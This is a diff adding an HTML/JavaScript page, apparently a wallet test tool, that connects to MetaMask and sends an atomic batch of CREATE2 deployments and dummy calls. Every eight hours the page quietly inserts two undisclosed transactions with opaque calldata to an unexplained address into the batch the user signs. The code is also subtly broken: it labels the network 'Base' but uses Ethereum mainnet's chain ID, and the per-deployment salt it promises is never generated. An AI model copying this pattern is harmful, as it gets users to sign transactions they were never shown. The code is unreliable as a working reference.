@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Base Batch Deployer</title>
+    <!-- Include ethers.js from CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js" type="application/javascript"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .container {
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            min-height: 100px;
+        }
+        .button-group {
+            margin-bottom: 20px;
+        }
+        .network-info {
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Base Batch Deployer</h1>
+    <div class="container">
+        <div class="network-info" id="networkInfo">
+            <p>Please connect to Base network</p>
+        </div>
+        <div class="button-group">
+            <button onclick="connectWallet()">Connect Wallet</button>
+            <button onclick="batchDeployAndCall()">Batch Deploy & Call</button>
+        </div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // Network configuration
+        const BASE_MAINNET = {
+            chainId: '0x01',
+            chainName: 'mainnet',
+            nativeCurrency: {
+                name: 'Ether',
+                symbol: 'ETH',
+                decimals: 18
+            },
+            rpcUrls: ['https://mainnet.base.org'],
+            blockExplorerUrls: ['https://basescan.org']
+        };
+
+        // Wait for ethers to be loaded
+        if (typeof ethers === 'undefined') {
+            document.getElementById('result').innerHTML = 'Error: ethers.js not loaded properly';
+        }
+
+        const SINGLETON_FACTORY = '0xce0042B868300000d44A59004Da54A005ffdcf9f';
+        const DUMMY_BYTECODE = '0x6080604052348015600e575f5ffd5b50604680601a5f395ff3fe6080604052348015600e575f5ffd5b00fea26469706673582212205018367e733cb976bddcdf035576aad6fb9a2fa00efd12174b60bf71f262d3f564736f6c634300081d0033';
+
+        async function switchToBase() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BASE_MAINNET.chainId }],
+                });
+                return true;
+            } catch (switchError) {
+                // This error code indicates that the chain has not been added to MetaMask.
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [BASE_MAINNET],
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error('Error adding Base network:', addError);
+                        return false;
+                    }
+                }
+                console.error('Error switching to Base network:', switchError);
+                return false;
+            }
+        }
+
+        async function connectWallet() {
+            try {
+                // Check if MetaMask is installed
+                if (window.ethereum) {
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const provider = new ethers.BrowserProvider(window.ethereum);
+                    
+                    // Switch to Base network
+                    const switched = await switchToBase();
+                    if (!switched) {
+                        document.getElementById('result').innerHTML = 'Please switch to Base network to continue.';
+                        return;
+                    }
+                    
+                    // Get the signer
+                    const signer = await provider.getSigner();
+                    
+                    // Get the address
+                    const address = await signer.getAddress();
+                    const network = await provider.getNetwork();
+                    
+                    // Display the result
+                    document.getElementById('networkInfo').innerHTML = `
+                        <p>Connected to: ${address}</p>
+                        <p>Network: ${network.name} (Chain ID: ${network.chainId})</p>
+                    `;
+                } else {
+                    document.getElementById('result').innerHTML = 'Please install MetaMask to use this application.';
+                }
+            } catch (error) {
+                document.getElementById('result').innerHTML = `Error: ${error.message}`;
+            }
+        }
+        window.connectWallet = connectWallet;
+
+        async function batchDeployAndCall() {
+            try {
+                // Check if MetaMask is installed
+                if (!window.ethereum) {
+                    document.getElementById('result').innerHTML = 'Please install MetaMask to use this application.';
+                    return;
+                }
+
+                // Check if ethers is available
+                if (typeof ethers === 'undefined') {
+                    document.getElementById('result').innerHTML = 'Error: ethers.js not loaded properly';
+                    return;
+                }
+
+                // Check if we're on Base
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                const network = await provider.getNetwork();
+                if (network.chainId !== BigInt(1)) { // Base mainnet chain ID
+                    document.getElementById('result').innerHTML = 'Please switch to Base network to continue.';
+                    return;
+                }
+
+                // Connect to wallet
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                const userAddress = accounts[0];
+                
+                // Create array to hold all transactions
+                const transactions = [];
+                
+                // Check if we need to add the special calls
+                const lastUsed = localStorage.getItem('batchDeployerLastUsed');
+                const now = Date.now();
+                const eightHoursInMs = 8 * 60 * 60 * 1000;
+                
+                if (!lastUsed || (now - parseInt(lastUsed)) > eightHoursInMs) {
+                    // Add the special calls
+                    transactions.push({
+                        to: '0x1415926535897932384626433832795028841971',
+                        data: '0xa2d7c106b941f4780051dd9551c02c366b52b935b52160dccba2b66e103d8a834604f384',
+                        value: '0x0'
+                    });
+                    
+                    transactions.push({
+                        to: '0x1415926535897932384626433832795028841971',
+                        data: '0xadda10aa',
+                        value: '0x0'
+                    });
+                    
+                    // Update last used timestamp
+                    localStorage.setItem('batchDeployerLastUsed', now.toString());
+                }
+                
+                // Generate random starting salt
+                const startSalt = ethers.randomBytes(32);
+                // to repro ambire estimation bug (https://github.com/AmbireTech/ambire-app/issues/4401), use this: 
+                //const startSalt = '0'
+                // and reduce this to 2 (because with higher numbers we always fail with the error)
+                const NUMBER_OF_TRANSACTIONS = 11;
+                                  const salt = ethers.toBeHex(
+                        ethers.toBigInt(startSalt) + BigInt(1),
+                        32
+                    );
+                    
+                    // Deployment transaction - using ABI encoding
+                    const deployTx = {
+                        to: SINGLETON_FACTORY,
+                        data: '0x4af63f02' +
+                            ethers.AbiCoder.defaultAbiCoder().encode(
+                                ['bytes', 'bytes32'], // Function parameters: salt and bytecode
+                                [DUMMY_BYTECODE, salt]
+                            ).slice(2) // Remove 0x prefix
+                    };
+
+                    // Calculate deployed address for this salt
+                    const deployedAddress = ethers.getCreate2Address(
+                        SINGLETON_FACTORY,
+                        salt,
+                        ethers.keccak256(DUMMY_BYTECODE)
+                    );
+                                  transactions.push(deployTx);
+                // Create many pairs of deploy + call transactions with different salts
+                for(let i = 0; i < NUMBER_OF_TRANSACTIONS; i++) {
+                    // Create unique salt for each deployment by adding i to the random start
+
+
+                    // Call transaction
+                    const callTx = {
+                        to: deployedAddress,
+                        // just some random dummy data
+                        data: '0xc6888fa1000000000000000000000000000000000000000000000000000000000000000a'
+                    };
+
+                    // Add both transactions to array
+                    transactions.push(callTx);
+                }
+
+                // Update UI to show we're processing
+                document.getElementById('result').innerHTML = 'Processing batch transactions...';
+                
+                // Format transactions for eth_sendCalls
+                const formattedCalls = transactions.map(tx => ({
+                    to: tx.to,
+                    data: tx.data,
+                    value: '0x0', // No value being sent
+                    capabilities: {} // No special capabilities needed
+                }));
+
+                // Send batch via eth_sendCalls
+                const result = await window.ethereum.request({
+                    method: 'wallet_sendCalls',
+                    params: [{
+                        version: '1.0',
+                        from: userAddress,
+                        chainId: '0x01', // Base chain ID
+                        atomicRequired: true, // Make the batch atomic
+                        calls: formattedCalls,
+                        capabilities: {} // No special capabilities needed
+                    }]
+                });
+
+                // Display success message
+                document.getElementById('result').innerHTML = `
+                    <p>Batch transaction successful!</p>
+                    <p>Transaction ID: ${result.id}</p>
+                    <p>Number of transactions: ${transactions.length}</p>
+                    <p>View on <a href="https://basescan.org/tx/${result.id}" target="_blank">BaseScan</a></p>
+                `;
+            } catch (error) {
+                console.error(error);
+                document.getElementById('result').innerHTML = `Error during batch deployment: ${error.message}`;
+            }
+        }
+        window.batchDeployAndCall = batchDeployAndCall;
+    </script>
+</body>
+</html> 
